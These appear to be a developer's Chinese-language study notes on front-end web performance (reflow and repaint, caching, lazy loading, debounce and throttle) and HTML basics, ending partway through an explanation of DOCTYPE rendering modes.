- 动态脚本元素：文档对象模型（DOM）允许你使用js动态创建HTML的几乎全部文档内容。

- async : 并行加载js，`下载完毕立即解释执行代码`，不会按照页面上的script顺序执行。
- defer : 并行下载js，在页面解析完毕之后，会按照页面上的script标签的顺序执行,同时会在document的DOMContentLoaded之前执行。
  - 注： HTML5规范要求脚本执行应该按照脚本出现的先后顺序执行，但实际情况下，延迟脚本不一定按照先后顺序执行

![img](https://image.fundebug.com/2019-01-03-7.png)

我们知道，当网页生成的时候，至少会渲染一次。在用户访问的过程中，还会不断重新渲染。重新渲染会重复上图中的第四步(回流)+第五步(重绘)或者只有第五个步(重绘)。

- 重绘:当render tree中的一些元素需要更新属性，而这些属性只是影响元素的外观、风格，而不会影响布局的，比如background-color。
- 回流:当render tree中的一部分(或全部)因为元素的规模尺寸、布局、隐藏等改变而需要重新构建

**回流必定会发生重绘，重绘不一定会引发回流**。重绘和回流会在我们设置节点样式时频繁出现，同时也会很大程度上影响性能。回流所需的成本比重绘高的多，改变父节点里的子节点很可能会导致父节点的一系列回流。

#### 1）常见引起回流属性和方法

任何会改变元素几何信息(元素的位置和尺寸大小)的操作，都会触发回流，

- 添加或者删除可见的DOM元素；
- 元素尺寸改变——边距、填充、边框、宽度和高度
- 内容变化，比如用户在input框中输入文字
- 浏览器窗口尺寸改变——resize事件发生时
- 计算 offsetWidth 和 offsetHeight 属性
- 设置 style 属性的值

DOM的重绘和回流Repaint&Reflow

顺序：先回流在重绘

**重绘：**元素样式的改变（但宽度、大小、位置等不变）

​		**如outline,visiblity,color,background-color等**

**回流（重排）：**元素的大小或者位置发生了变化（当页面布局和几何信息发生变化的时候），触发了重新布局，导致渲染树重新计算布局和渲染

​		如添加或删除可见的DOM元素；元素的位置发生变化；元素的尺寸发生变化；内容发生变化(比如文本变化或图片被另一个不同尺寸的图片所替代)；页面一开始渲染的时候（这个无法避免）；因为回流是根据视口大小来计算元素的位置和大小的，所以浏览器的窗口尺寸变化也会引发回流...

注意：回流一定触发重绘，而重绘不一定会回流

​		  网页默认会有css样式，会生成默认的CSSOM，遇到html标签就会解析，一点一点解析，并渲染，但是现代浏览器为了优化性能，会解析到一定程度才会渲染（重排和重绘），比如遇到<style><link><script>标签，

### 性能优化

#### **一、PC端优化策略**

   主要包括网络加载类、页面渲染类、CSS优化类、JavaScript执行类、缓存类、图片类、架构协议类等几类；

##### **1、网络加载类**

（1）减少HTTP资源请求次数：

   在前端页面中，通常建议尽可能合并静态资源图片、JavaScript或CSS代码，减少页面请求数和资源请求消耗，这样可以缩短首屏加载时间，通过构建工具合并雪碧图、CSS、JavaScript文件等都是为了减少HTTP资源请求次数，另外也要尽量避免重复的资源，防止增加多余请求；

（2）减少HTTP请求大小：

   除了减少HTTP资源请求次数，也要尽量减少每个HTTP请求的大小，如减少没必要的图片、JavaScript、CSS 及 HTML 代码，对文件进行压缩优化，或者使用gzip压缩传输内容等都可以用来减少文件大小，缩短网络传输等待时延，使用构建工具来压缩静态图片资源以及移除代码中的注释并压缩，目的都是为了减少HTTP请求的大小；

（3）将CSS或JavaScript放到外部文件中，避免使用style或script标签直接引入：

   在HTML文件上引用外部资源可以有效利用浏览器的静态资源缓存，但有时候在移动端页面CSS或JavaScript比较简单的情况下为了减少请求，也会将CSS或JavaScript直接写到HTML里面，具体要根据CSS或JavaScript文件的大小和业务的场景来分析，如果CSS或JavaScript文件内容较多，业务逻辑较复杂，建议放到外部文件引入；

```xml
     <link rel="stylesheet" href="/css/master.css">
     <script type="text/javascript" src="//cdn.domain.com/path/main.js"></script>
```

（4）避免页面中空的href和src：

   当<link>标签的href属性为空，或<script>、<img>、<iframe>标签的src属性为空时，浏览器在渲染过程中仍会将href属性或者src属性中的空内容进行加载，直至加载失败，这样就阻塞了页面中其他资源的下载进程，而且最终加载到的内容是无效的，因此要尽量避免；

```xml
       <!--不推荐-->
       <img src="" alt="photo" >
       <a href="">点击链接</a>
```

（5）为HTML指定Cache-Control或Expires：

   为HTML内容设置Cache-Control 或 Expires可以将HTML内容缓存起来，避免频繁向服务器端发送请求，在页面中的Cache-Control 或 Expires头部有效时，浏览器将直接从缓存中读取内容，不再向服务器端发送请求；

```xml
       <meta http-equiv="Cache-Control" content="max-age=7200">
       <meta http-equiv="Expires" content="Mon,20Jul201623:00:00GMT">
```

（6）合理设置Etag和Last-Modified：

   合理设置Etag 和 Last-Modified使用浏览器缓存，对于未修改的文件，静态资源服务器会向浏览器端返回304，让浏览器从缓存中读取文件，减少Web资源下载的带宽消耗并降低服务器负载；

```xml
	<meta http-equiv="last-modified" content="Sun,05 Nov 2017 13:45:57 GMT">
```

（7）减少页面重定向：

   页面每次重定向都会延长页面内容返回的等待延时，一次重定向大约需要200毫秒不等的时间开销（无缓存），为了保证用户尽快看到页面内容，要尽量避免页面重定向；

（8）使用静态资源分域存放来增加下载并行数：

   浏览器在同一时刻向同一域名请求文件的并行下载数是有限的，因此可以利用多个域名的主机来存放不同的静态资源，增大页面加载时资源的并行下载数，缩短页面资源加载的时间，通常根据多个域名来分别存储JavaScript、CSS和图片文件；

```xml
     <link rel="stylesheet" href="//cdn1.domain.com/path/main.css" >
     <script src="//cdn2.domain.com/path/main.js"></script>
```

（9）使用静态资源CDN来存储文件：
    如果条件允许，可以利用CDN网络加快同一个地理区域内重复静态资源文件的响应下载速度，缩短资源请求时间；

（10）使用CDN Combo下载传输内容：

   CDN Combo是在CDN服务器端将多个文件请求打包成一个文件的形式来返回的技术，这样可以实现HTTP连接传输的一次性复用，减少浏览器的HTTP请求数，加快资源下载速度，例如同一个域名CDN服务器上的a.js，b.js，c.js就可以按如下方式在一个请求中下载：



```xml
<script src="//cdn.domain.com/path/a.js,b.js,c.js"></script>
```

（11）使用可缓存的AJAX：

   对于返回内容相同的请求，没必要每次都直接从服务端拉取，合理使用AJAX缓存能加快AJAX响应速度并减轻服务器压力；

```tsx
$.ajax({
     url: url,
     type: 'get',
     cache: true, //推荐使用缓存
     data: {},
     success() {},
     error() {}
    });
```

（12）使用GET来完成AJAX请求：

   使用XMLHttpRequest时,浏览器中的POST方法会发起两次TCP数据包传输，首先会发送文件头，然后发送HTTP正文数据，而使用GET时只发送头部，所以在拉取服务端数据时使用GET请求效率更高；



```tsx
$.ajax({
  url: url,
  type: 'get', //推荐使用get完成请求
  data: {},
  success() {},
  error() {}
});
```

（13）减少Cookie的大小并进行Cookie隔离：

   HTTP请求通常默认带上浏览器端的Cookie一起发送给服务器，所以在非必要的情况下，要尽量减少Cookie来减少HTTP请求的大小，对于静态资源，尽量使用不同的域名来存放，因为Cookie默认是不能跨域的，这样就做到了不同域名下静态资源请求的Cookie隔离；

（14）缩小favicon.ico并缓存：

   有利favicon.ico的重复加载，因为一般一个Web应用的favicon.ico是很少改变的；

（15）推荐使用异步JavaScript资源：

   异步的JavaScript资源不会阻塞文档解析，所以允许在浏览器中优先渲染页面，延后加载脚本执行，例如JavaScript的引用可以如下设置，也可以使用模块化加载机制来实现；其中使用async时，加载和渲染后续文档元素的过程和main.js的加载与执行是并行的；使用defer时，加载后续文档元素的过程和main.js的加载是并行的，但是main.js的执行要在页面所有元素解析完成之后才开始执行；

```xml
<script src="main.js" defer></script>
<script src="main.js" async></script>
```

（16）消除阻塞渲染的CSS及JavaScript：

   对于页面中加载时间过长的CSS或JavaScript文件，需要进行合理拆分或延后加载，保证关键路径的资源能快速加载完成；

（17）避免使用CSS import引用加载CSS：

   CSS中的@import可以从另一个样式文件中引入样式，但应该避免这种用法，因为这样会增加CSS资源加载的关键路径长度，带有＠import的CSS样式需要在CSS文件串行解析到＠import时才会加载另外的CSS文件，大大延后CSS渲染完成的时间；

```xml
<!--不推荐-->
<style>
@import "path/main.css";
</style>

<!--推荐-->
<link rel="stylesheet" href="//cdn1.domain.com/path/main.css" >
```

##### **2、页面渲染类**

（1）把CSS资源引用放到HTML文件顶部：

   一般推荐将所有CSS资源指定在HTML文档<head>中，这样浏览器可以优先下载CSS并尽早完成页面渲染；

（2）JavaScript资源引用放到HTML文件底部：

   JavaScript资源放到HTML文档底部可以防止JavaScript的加载和解析执行对页面渲染造成阻塞，由于JavaScript资源默认是解析阻塞的，除非被标记为异步或者通过其他的异步方式加载，否则会阻塞HTML DOM解析和CSS渲染过程；

（3）尽量预先设定图片等大小：

   在加载大量的图片元素时，尽量预先限定图片的尺寸大小，否则在图片加载过程中会更新图片的排版信息，产生大量的重排；

（4）不要在HTML中直接缩放图片：

   在HTML中直接缩放图片会导致页面内容的重排重绘，此时可能会使页面中的其他操作产生卡顿，因此要尽量减少在页面中直接进行图片缩放；

（5）减少DOM元素数量和深度：

   HTML中标签元素越多，标签的层级越深，浏览器解析DOM并绘制到浏览器中所花的时间就越长，所以应尽可能保持DOM元素简洁和层级较少；

```xml
     <!--不推荐-->
     <div>
       <span>
           <a href="javascript:void(0);">
               <img src="./path/photo.jpg" alt="图片">
           </a>
        </span>
     </div>
     <!--推荐-->
     <img src="./path/photo.jpg" alt="图片" >
```

（6）尽量避免在选择器末尾添加通配符：

   CSS解析匹配到渲染树的过程是从右到左的逆向匹配，在选择器末尾添加通配符至少会增加一倍多计算量；

（7）减少使用关系型样式表的写法：

   直接使用唯一的类名即可最大限度的提升渲染引擎绘制渲染树的效率；

（8）尽量减少使用JS动画：

   JS直接操作DOM极容易引起页面的重排；

（9）CSS动画使用translate、scale代替top、height：

   尽量使用CSS3的translate、scale属性代替top、left和height、width，避免大量的重排计算；

（10）尽量避免使用<table>、<iframe>：

     <table>内容的渲染是将table的DOM渲染树全部生成完并一次性绘制到页面上的，所以在长表格渲染时很耗性能，应该尽量避免使用它，可以考虑使用列表元素<ul>代替；尽量	 使用异步的方式动态添加iframe，因为iframe内资源的下载进程会阻塞父页面静态资源的下载与CSS及HTML DOM的解析；

（11）避免运行耗时的JavaScript：

   长时间运行的JavaScript会阻塞浏览器构建DOM树、DOM渲染树、渲染页面，所以任何与页面初次渲染无关的逻辑功能都应该延迟加载执行，这和JavaScript资源的异步加载思路是一致的；

（12）避免使用CSS表达式或CSS滤镜：

   CSS表达式或CSS滤镜的解析渲染速度是比较慢的，在有其他解决方案的情况下应该尽量避免使用；

```swift
     //不推荐
     .opacity{
         filter : progid : DXImageTransform.Microsoft.Alpha( opacity = 50 );
     }
```

（13）减少 DOM的回流

​		1、放弃传统操作dom的时代，基于vue/react开始数据影响视图模式

​				mvvc/mvc/virtual dom/dom diff...

​		2、分离读写操作（现代的浏览器都有渲染队列的机制，`如果操作dom代码的下一行还是操作dom,那么只会引发一次回流`）

​				offsetTop、offsetLeft...

​		3、样式集中改变

​				div.style.cssText = 'width:20px;height:20px'

​				div.className = 'box'

​				不要一条一条地修改DOM的样式，预先定义好class，然后修改DOM的className

​		4、缓存布局信息

​			<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505215749.png" alt="image-20210103202306210" style="zoom:80%;" />

​		5、文档碎片（documentFragment) ----- vue使用了该种方式提升性能			

```
		//1、创建文档碎片
		let frg = document.createDocumentFragment()
		for(let i = 0;i<5;i++){
			let nweLi = document.createElement('li');
			newLi.innerHTML = i;
			//创建的li放到文档碎片中，这样不会引发回流，文档碎片只是一个临时的容器
			frg.appendChild(newLi)
		}
		//一次性把内容放到容器中，这样只会引发一次回流
		box.appendChild(frg)
		//销毁文档碎片容器
		frg = null
```

​		6、字符串拼接		

```
		let str = ``;
		for(let i = 0;i<5;i++){
			str+=`<li>${i}</li>
		} 
		box.innerHTML = str
```

​		7、动画效果应用到position属性为absolute或fixed的元素上（脱离文档流）

​		8、CSS3硬件加速（GPU加速）

​			transform:translateZ(0)

​			比起考虑如何减少回流重绘，我们更期待的是，根本不要回流重绘；transform\opacity\filters...这些属性会触发硬件加速，不会

​			引发回流和重绘......

​			可能引发的坑：过多使用会占用大量内存，性能消耗严重、有时候会导致字体模糊等

```
		//这样会引发回流
		//box.style.left = '100px'
		//这样会触发赢家加速，不会引发回流
		box.style.transform = 'translateX(100px)'
```

​		9、避免table布局和使用css的javascript表达式

​		10、将DOM离线后再修改

​				由于display属性为name的元素不在渲染树中，对隐藏的元素操作不会引发其他元素的重排。

​				如果要对一个元素进行复杂的操作时，可以先隐藏它，操作完成后再显示。这样只在隐藏和显示时触发两次

​		11、使用opacity配合图层使用，既不触发重绘也不触发重排

##### 3、函数防抖

> 概念：延迟要执行的动作，若在延时的这段时间内，再次触发了，则取消之前开启的动作，重新计时
>
> 举例：电脑无操作一分钟后会进入休眠，当第40秒鼠标被移动了以下，重新计时1分子
>
> 实现：定时器
>
> 应用：搜索时等用户完整输入内容后再发送查询请求

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
  <input type="text" id="user_input">
  <button id="btn">搜索</button>
  <script>
    let input = document.getElementById("user_input")
    let id
    input.addEventListener('keyup',()=>{
      // 1、获取用户的输入
      let data = input.value
      clearTimeout(id)
      id = setTimeout(() => {
          mockAjax(data)
      }, 300);
    })
    function mockAjax(data) {
      console.log(`sendAjax------${data}`);
    }
  </script>
</body>
</html>
```

##### 4、函数节流

> 概念：设定一个特定的时间，让函数在特定的时间内只执行一次，不会频繁切换
>
> 举例：fps游戏，鼠标按住不松手，子弹也不会连成一条线
>
> 实现：定时器、标识
>
> 需求：在鼠标滚轮滚动的时候，每隔2秒钟，打印一次

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <style>
    body{
      height: 4000px;
    }
  </style>
</head>
<body>
  <div></div>
  <script>
    let flag = true
    document.onscroll = function () {
      if(flag){
        console.log(1);
        flag = false
        setTimeout(() => {
          flag = true
        }, 2000);
      }
    }
  </script>
</body>
</html>
```

防抖和节流的主要区别是：

​		**防抖是两个动作之间的时间间隔有限制，节流是在一定时间内执行次数的限制**

##### 5、请求动画帧

> window.requestAnimationFrame()

1、window.requestAnimationFrame()

​		说明：该方法会告诉浏览器在重绘之前调用你所指定的函数

​		1、参数：该方法使用一个回调函数作为参数，这个回调函数会在浏览器重绘之前调用

​						回调函数会被自动传入一个参数，DOMHighResTimeStamp,标识requestAnimationFrame()开始触发回调函数的当前时间

​		2、返回值：

​						一个long整数，也成为请求ID,是个非零值，是回调列表中唯一的标识，没别的意义。

2、window.cancelAnimationFrame(requestId)

​		取消一个先前通过调用window.requestAnimationFrame()方法添加到计划中的动画帧请求。

​		requestID是先前通过调用window.requestAnimationFrame()方法时返回的ID

#### **二、移动端优化策略**

**1、网络加载类**

（1）首屏数据请求提前，避免JavaScript文件加载后才请求数据：

   为了进一步提升页面加载速度，可以考虑将页面的数据请求尽可能提前，避免在JavaScript加载完成后才去请求数据，通常数据请求是页面内容渲染中关键路径最长的部分，而且不能并行，所以如果能将数据请求提前，可以极大程度缩短页面内容的渲染完成时间；

（2）首屏加载和按需加载，非首屏内容滚屏加载，保证首屏内容最小化：

   由于移动端网络速度相对较慢，网络资源有限，因此为了尽快完成页面内容的加载，需要保证首屏加载资源最小化，非首屏内容使用滚动的方式异步加载，一般推荐移动端页面首屏数据展示延时最长不超过3秒，目前中国联通3G的网络速度为338KB/s (2.71Mb/s)，所以推荐首屏所有资源大小不超过1014KB，即大约不超过1MB；

（3）模块化资源并行下载：

   在移动端资源加载中，尽量保证JavaScript资源并行加载，主要指的是模块化JavaScript资源的异步加载，例如AMD的异步模块，使用并行的加载方式能够缩短多个文件资源的加载时间；

（4）inline首屏必备的CSS和JavaScript：

   通常为了在HTML加载完成时能使浏览器中有基本的样式，需要将页面渲染时必备的CSS和JavaScript通过<script>或<style>内联到页面中，避免页面HTML载入完成到页面内容展示这段过程中页面出现空白；

```xml
<!DOCTYPE html>

<head>
  <meta charset="UTF-8">
  <title>样例</title>
  <meta>
  <style>
    /*必备的首屏CSS*/
    html,
    body {
      margin: 0;
      padding: 0;
      background-color: #ccc;
    }
  </style>
</head>

<body>
</body>

</html>
```

（5）meta dns prefetch设置DNS预解析：

   设置文件资源的DNS预解析，让浏览器提前解析获取静态资源的主机IP，避免等到请求时才发起DNS解析请求，通常在移动端HTML中可以采用如下方式完成：

```xml
<!--cdn域名预解析-->
<meta http-equiv="x-dns-prefetch-control" content="on" >
<link rel="dns-prefetch" href="//cdn.domain.com" >
```

（6）资源预加载：

   对于移动端首屏加载后可能会被使用的资源，需要在首屏完成加载后尽快进行加载，保证在用户需要浏览时已经加载完成，这时候如果再去异步请求就显得很慢；

（7）合理利用MTU策略：

   通常情况下，我们认为TCP网络传输的最大传输单元（Maximum Transmission Unit，MTU）为 1500B，即一个 RTT（Round-Trip Time，网络请求往返时间）内可以传输的数据量最大为1500字节，因此在前后端分离的开发模式中，尽量保证页面的HTML内容在1KB以内，这样整个HTML的内容请求就可以在一个RTT内请求完成，最大限度地提高HTML载入速度；

##### 2、缓存类

（1）合理利用浏览器缓存：

   除了上面所说的Cache-Control、Expires、Etag 和 Last-Modified来设置HTTP缓存外，在移动端还可以使用localStorage等来保存AJAX返回的数据，或者使用localStorage保存CSS或JavaScript静态资源内容，实现移动端的离线应用，尽可能减少网络请求，保证静态资源内容的快速加载；

（2）静态资源离线方案：

   对于移动端或Hybrid应用，可以设置离线文件或离线包机制让静态资源请求从本地读取，加快资源载入速度，并实现离线更新；

（3）尝试使用AMP HTML

   AMP HTML可以作为优化前端页面性能的一个解决方案，使用AMP Component中的元素来代替原始的页面元素进行直接渲染；



```xml
<!--不推荐-->
<video width="400" height="300" src="//www.domain.com/videos/myvideo.mp4"
poster="path/poster.jpg">
<div fallback>
    <p>Your browser doesn’t support HTML5 video</p>
</div>
<source type="video/mp4" src="foo.mp4">
<source type="video/webm" src="foo.webm">
</video>

<!--推荐-->
<amp-video width="400" height="300" src="//www.domain.com/videos/myvideo.mp4" poster="path/poster.jpg">
<div fallback>
   <p>Your browser doesn’t support HTML5 video</p>
</div>
<source type="video/mp4" src="foo.mp4">
<source type="video/webm" src="foo.webm">
</amp-video>
```

（4）尝试使用PWA模式：

   PWA（Progressive Web Apps）是 Google 提出的用前沿的 Web 技术为网页提供 App 般使用体验的一系列方案；

##### 3、图片类

（1）图片压缩处理：

   在移动端，通常要保证页面中一切用到的图片都是经过压缩优化处理的，而不是以原图的形式直接使用的，因为那样很消耗流量，而且加载时间更长；

（2）使用较小的图片，合理使用base64内嵌图片：

   在页面使用的背景图片不多且较小的情况下，可以将图片转化成base64编码嵌入到HTML页面或CSS文件中，这样可以减少页面的HTTP请求数，需要注意的是，要保证图片较小，一般图片大小超过2KB就不推荐使用base64嵌入显示了；



```css
.class-name{
    background-image : url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAALCAMAAABxsOwqAAAAYFBMVEWnxwusyQukxQudwQyZvgyhxAyfwgyxzAsUHQGOuA0aJAERGAFIXwSTugyEqgtqhghQZgUwQQIpOQKbuguVtQuKrAuCowp2kQlheghTbQZHWQU7SwVAVgQ6TgQlLwMeKwFOemyQAAAAVElEQVQI1y3JVRaAIAAF0UconXbvf5ei8HfPDIQQhBAAFE10iKig3SLRNN4SP/p+N08VC0YnfIlNWtqIkhg/TPYbCvhqdHAWRXPZSp3g3CWZvVLXC6OJA3ukv0AaAAAAAElFTkSuQmCC');
}
```

（3）使用更高压缩比格式的图片：

   使用具有较高压缩比格式的图片，如webp（需要设计降级兼容方案）等，在同等图片画质的情况下，高压缩比格式的图片体积更小，能够更快完成文件传输，节省网络流量；

```xml
<img src="//cdn.domain.com/path/photo.webp" alt="webp格式图片" >
```

（4）图片懒加载：

   为了保证页面内容的最小化，加速页面的渲染，尽可能节省移动端网络流量，页面中的图片资源推荐使用懒加载实现，在页面滚动时动态载入图片；

```kotlin
<img data-src="//cdn.domain.com/path/photo.jpg" alt="懒加载图片" >
```

（5）使用MediaQuery 或 srcset根据不同屏幕加载不同大小图片：

   针对不同的移动端屏幕尺寸和分辨率，输出不同大小的图片或背景图能保证在用户体验不降低的前提下节省网络流量，加快部分机型的图片加载速度，这在移动端非常值得推荐；

（6）使用iconfont代替图片图标：

   在页面中尽可能使用iconfont来代替图片图标，这样做的好处有：使用iconfont体积较小，而且是矢量图，因此缩放时不会失真；可以方便地修改图片大小尺寸和呈现颜色；但是需要注意的是，iconfont引用不同webfont格式时的兼容性写法，根据经验推荐尽量按照以下顺序书写，否则不容易兼容到所有的浏览器上；

```css
@font-face{
   font-family:iconfont;
   src:url("./iconfont.eot");
   src:url("./iconfont.eot?#iefix") format("eot"),
   url("./iconfont.woff") format("woff"),
   url("./iconfont.ttf") format("truetype");
}
```

（7）定义图片大小限制：

   加载的单张图片一般建议不超过30KB，避免大图片加载时间长而阻塞页面其他资源的下载，因此推荐10KB以内，如果用户上传的图片过大，建议设置告警系统，帮助我们观察了解整个网站的图片流量情况，做出进一步的改善；

（8）强缓存策略：

   对于一些永远不会变的图片可以使用强缓存的方式缓存在用户的浏览器上；

##### 4、脚本类

（1）尽量使用id：

   选择器选择页面DOM元素时尽量使用id选择器，因为id选择器速度最快；

（2）合理缓存DOM对象：

   对于需要重复使用的DOM对象，要优先设置缓存变量，避免每次使用时都要从整个DOM树中重新查找；

```jsx
//不推荐
$('#mod.active').remove('active');
$('#mod.not-active').addClass('active');

//推荐
let $mod=$('#mod');
$mod.find('.active').remove('active');
$mod.find('.not-active').addClass('active');
```

（3）页面元素尽量使用事件代理，避免直接事件绑定：

   使用事件代理可以避免对每个元素都进行绑定，并且可以避免出现内存泄露及需要动态添加元素的事件绑定问题，所以尽量不要直接使用事件绑定；

```jsx
//不推荐
$('.btn').on('click',function(e){
   console.log(this);
});

//推荐
$('body').on('click','.btn',function(e){
   console.log(this);
});
```

（4）使用touchstart代替click：

   由于移动端屏幕的设计，touchstart事件和click事件触发时间之间存在300毫秒的延时，所以在页面中没有实现touchmove滚动处理的情况下，可以使用touchstart事件来代替元素的click事件，加快页面点击的响应速度，提高用户体验，但同时我们也要注意页面重叠元素touch动作的点击穿透问题；



```jsx
//不推荐
$('body').on('click','.btn',function(e){
    console.log(this);
});

//推荐
$('body').on('touchstart','.btn',function(e){
    console.log(this);
});
```

（5）避免touchmove、scroll连续事件处理：

   需要对touchmove、scroll这类可能连续触发回调的事件设置事件节流，例如设置每隔16ms（60帧的帧间隔为16.7ms，因此可以合理地设置为16ms）才进行一次事件处理，避免频繁的事件调用导致移动端页面卡顿；

```jsx
//不推荐
$('.scroller').on('touchmove','.btn',function(e){
  console.log(this);
});

//推荐
$('.scroller').on('touchmove','.btn',function(e){
  let self=this;
  setTimeout(function(){
    console.log(self);
  },16);
});
```

（6）避免使用eval、with，使用join代替连接符+，推荐使用ECMAScript6的字符串模板，这些都是一些基础的安全脚本编写问题，尽可能使用较高效率的特性来完成这些操作，避免不规范或不安全的写法；

（7）尽量使用ECMAScript6+的特性来编程：

   ECMAScript6+一定程序上更加安全高效，而且部分特性执行速度更快，也是未来规范的需要，所以推荐使用ECMAScript6+的新特性来完成后面的开发；

##### 5、渲染类

（1）使用Viewport固定屏幕渲染，可以加速页面渲染内容：

   一般认为，在移动端设置Viewport可以加速页面的渲染，同时可以避免缩放导致页面重排重绘；

（2）避免各种形式重排重绘：

   页面的重排重绘很耗性能，所以一定要尽可能减少页面的重排重绘，例如页面图片大小变化，元素位置变化等这些情况都会导致重排重绘；

（3）使用CSS3动画，开启GPU加速：

   使用CSS3动画时可以设置transform:translateZ(0) 来开启移动设备浏览器的GPU图形处理加速，让动画过程更加流畅，但需要注意的是，在Native WebView 下 GPU 加速有几率产生 App Crash；

```css
     -webkit-transform:translateZ(0);
     -ms-transform:translateZ(0);
     -o-transform:translateZ(0);
     transform:translateZ(0);
```

（4）合理使用Canvas 和 requestAnimationFrame：

   选择Canvas 或requestAnimationFrame等更高效的动画实现方式，尽量避免使用setTimeout、setInterval等方式来直接处理连续动画；

（5）SVG 代替图片：

   部分情况下可以考虑使用SVG 代替图片实现动画，因为使用SVG格式内容更小，而且SVG  DOM结构方便调整；

（6）不滥用float：

   在DOM渲染树生成后的布局渲染阶段，使用float的元素布局计算比较耗性能，所以尽量减少float的使用，推荐使用固定布局或flex-box弹性布局的方式来实现页面元素布局；

（7）不滥用web字体或过多font-size声明：

   过多的font-size声明会增加字体的大小计算，而且也没有必要；

（8）做好脚本容错：

   脚本容错可以避免非正常环境的执行错误影响页面的加载和不相关功能的使用；

##### 6、架构协议类

（1）尝试使用 SPDY 和 HTTP2：

   在条件允许的情况下可以考虑使用 SPDY 协议来进行文件资源传输，利用连接复用加快传输过程，缩短资源加载时间，HTTP2 在未来也是可以考虑尝试的；

（2）使用后端数据渲染：

   使用后端数据渲染的方式可以加快页面内容的渲染展示，避免空白页面的出现，同时可以解决移动端页面 SEO 的问题，如果条件允许，后端数据渲染是一个很不错的实践思路；

（3）使用 NativeView 代替 DOM 的性能劣势：

   可以尝试使用 NativeView 的 MNV＊ 开发模式来避免 HTML DOM 性能慢的问题，目前使用 MNV＊ 的开发模式已经可以将页面内容渲染体验做到接近客户端 Native 应用的体验了，但需要避免 js Framework 和 native Framework 的频繁交互；

## 	基础知识

### 开发环境

#### 编译器：

##### VSCode:

​	插件：	

##### HBuilder

### 				HTML

#### HTML简介

1. **什么是HTML？**

   超文本标记语言(Hypertext Markup Language)"超文本"指的就是页面内可以包含图片，链接，甚至音乐，程序等非文本元素。

2. **HTML发展历史**

   超文本标记语言（第一版）–在1993年6月作文互联网工程工作小组（IETF）工作草案发布（并非标准）。
   HTML2.0 --1995年11月作为RFC 1866发布，在RFC2854于2000年6月发布之后被宣布已经过时。
   HTML3.0 --1997年1月14日，W3C推荐标准。
   HTML4.0 --1997年12月18日，W3C推荐标准。
   HTML4.01（微小改进） --1999年12月24日，W3C推荐标准。
   HTML5.0 --2014年10月28日，W3C推荐标准。

   本文简要介绍HTML中的各种元素及其相关属性，读者需要有一个概念: HTML页面都是由基本元素及属性组成的。HTML页面的结构如下。

   ```
   <!DOCTYPE html>         //浏览器得知自己需要处理的内容是html
   <html lang="en">     //文档中html开始的部分，lang ="en“ 表示内容为英文， 可以省略写为 <html> 
       <head>                    //提供有关内档内容和标注信息的内容
       </head>
       <body>                //内部的内容即为网页中显示的内容
       </body>
   </html>
   ```

   HTML 文档主要分为 Head 部分 和 Body 部分 两个部分

#### HTML语法规范

1. HTML中不区分大小写，但是我们一般都使用小写

2. HTML中的注释不能嵌套

   比如：

   ```
   <！--
   这是注释
   <!--注释中的注释-->
   -->
   ```

3. HTML标签必须结构完整，要么成对出现要么是自结束标签

4. HTML标签可以嵌套，但是不能交叉嵌套

   比如：

   ```
   正确：<p> test <font> test </font> </p>      
   错误：<p> test <font> test  </p> </font> 
   ```

5、HTML标签中的属性必须有值，且值必须加引号（虽然你不写浏览器也会帮你加上，但是这不规范）

6、自结束标签加不加/都可以

#### 设置网站的图标（标题栏和收藏栏）

![img](https://img2020.cnblogs.com/blog/2029744/202009/2029744-20200920235428178-2102817218.png)

1.  在网站域名后面加上favicon.ico就可以获取网站logo了

   然后把favicon.ico文件放在网站根目录

![image-20201016152718782](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505214244.png)

再用

```
<link rel="icon" href="./favicon.ico">
```

引入就行了

![img](https://img2020.cnblogs.com/blog/2029744/202009/2029744-20200920235606848-391138220.png)

之后图标就有了

 要是想把普通图片转化为.ioc文件类型可以点击下面链接转换

http://www.bitbug.net/

#### HTML头部结构详解

HTML head 头部分的标签、元素有很多，涉及到浏览器对网页的渲染，SEO等等，而各个浏览器内核以及各个国内浏览器厂商都有些自己的标签元素,这就造成了很多差异性。移动互联网时代，head 头部结构，移动端的meta 元素，显得更为重要。了解每个标签的意义，写出满足自己需求的head 头标签，是本文的目的。本篇以[一丝的文章](https://github.com/yisibl/blog/issues/1)为基础，进行扩展总结介绍常用的head中各个标签、元素的意义以及使用场景。

1. **DOCTYPE**

   DOCTYPE(Document Type)，该声明位于文档中最前面的位置，处于html 标签之前，此标签告知浏览器文档使用哪种HTML 或者XHTML 规范。

   DTD(Document Type Definition) 声明以<!DOCTYPE> 开始，不区分大小写，前面没有任何内容，如果有其他内容(空格除外)会使浏览器在IE下开启怪异模式(quirks mode)渲染网页。公共DTD，名称格式为注册//组织//类型 标签//语言,注册指组织是否由国际标准化组织(ISO)注册，+表示是，-表示不是。组织即组织名称，如：W3C。类型一般是DTD。标签是指定公开文本描述，即对所引用的公开文本的唯一描述性名称，后面可附带版本号。最后语言是DTD语言的ISO 639语言标识符，如：EN 表示英文，ZH 表示中文。XHTML 1.0可声明三种DTD 类型。分别表示严格版本，过渡版本，以及基于框架的HTML 文档。

   - HTML 4.01 strict

     ```
     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
     ```

   - HTML 4.01 Transitional

     ```
     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
     ```

   - HTML 4.01 Frameset

     ```
     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd">
     ```

   - 最新HTML5 推出更加简洁的书写，它向前向后兼容，推荐使用。

     ```
     <!doctype html>
     ```

   在HTML中 `doctype` 有两个主要目的。

   - 对文档进行有效性验证。

     它告诉用户代理和校验器这个文档是按照什么DTD 写的。这个动作是被动的，每次页面加载时，浏览器并不会下载DTD 并检查合法性，只有当手动校验页面时才启用。

   - 决定浏览器的呈现模式

     对于实际操作，通知浏览器读取文档时用哪种解析算法。如果没有写，则浏览器则根据自身的规则对代码进行解析，可能会严重影响html 排版布局。浏览器有三种方式解析HTML文档。

     - 非怪异（标准）模式
